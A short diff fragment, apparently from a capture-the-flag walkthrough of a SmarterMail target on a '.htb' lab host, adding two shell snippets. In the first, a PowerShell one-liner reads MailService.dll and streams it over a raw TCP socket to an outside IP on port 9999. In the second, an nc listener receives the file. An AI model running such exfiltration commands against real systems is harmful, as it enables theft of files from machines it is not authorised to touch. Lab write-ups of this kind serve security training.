@@ -1148,5 +1148,22 @@ SM.dll
 
 ```
 
+``` powershell
+
+C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b>powershell -c "$f=[IO.File]::ReadAllBytes('C:\Program Files (x86)\SmarterTools\SmarterMail\Service\MailService.dll');$t=New-Object Net.Sockets.TcpClient('10.10.15.166',9999);$t.GetStream().Write($f,0,$f.Length);$t.Close()"
+powershell -c "$f=[IO.File]::ReadAllBytes('C:\Program Files (x86)\SmarterTools\SmarterMail\Service\MailService.dll');$t=New-Object Net.Sockets.TcpClient('10.10.15.166',9999);$t.GetStream().Write($f,0,$f.Length);$t.Close()"
+
+C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b>
+
+```
+
+``` bash
+
+❯ nc -lvnp 9999 > MailService2.dll
+listening on [any] 9999 ...
+connect to [10.10.15.166] from (UNKNOWN) [10.129.82.45] 50997
+
+```
+
 
                       
